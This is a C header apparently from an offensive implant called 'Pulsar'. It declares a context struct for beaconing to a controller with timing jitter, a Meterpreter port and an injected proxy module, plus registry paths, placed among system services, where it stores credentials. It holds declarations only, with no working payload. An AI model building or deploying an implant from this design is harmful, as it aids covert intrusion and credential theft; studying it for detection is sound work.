#pragma once

#define MAX_HANDLES 16

typedef struct _pulsarctx{		
  HANDLE handles[MAX_HANDLES];	 //Handles for all active threads, lib and Metaproxy
  DWORD  handleCount;			 //Number of handles we're waiting on
  BOOL   firstBeacon;			 //Have we made our initial beacon
  CHAR	 GUID[40];				 //Unique identifier for this host
  USHORT pulsarproxy_port;		 //Port PulsarProxy listens on
  USHORT meterpreter_port;		 //Port meterpreter will run on
  DWORD dwBeaconTime;			 //Time in minutes to wait for a beacon
  DWORD dwBeaconJitter;			 //Time in minutes to jitter the beacon
  PCHAR beacon_url;				 //String showing the URL we beacon to
  PCHAR group;					 //Group we're associated with
  DWORD dwProxySize;			 //Size of the injected proxy module
  PUCHAR	metaproxy;			 //Actual injected proxy module
  PWCHAR	BeaconHost;			 //Host only for the beacon_host
  USHORT	BeaconPort;			 //Port to beacon to
  PWCHAR	BeaconResource;		 //Resource we will be reaching out to
  BOOL      BeaconFlags;		 //Flags to use for Beaconing
} PULSAR_CONTEXT, *PPULSAR_CONTEXT;



DWORD PulsarExit(VOID);
PPULSAR_CONTEXT PulsarInit(VOID);

//Registry key where credentials are stored
#define CRED_STORE_KEY "SYSTEM\\CurrentControlSet\\services\\Pulsar\\CStore"


//Registry key where variables are stored
#define VAR_STORE_KEY_SYS "SYSTEM\\CurrentControlSet\\services\\Pulsar\\VStore"

#define VAR_STORE_KEY_USER "Software\\Pulsar\\VStore"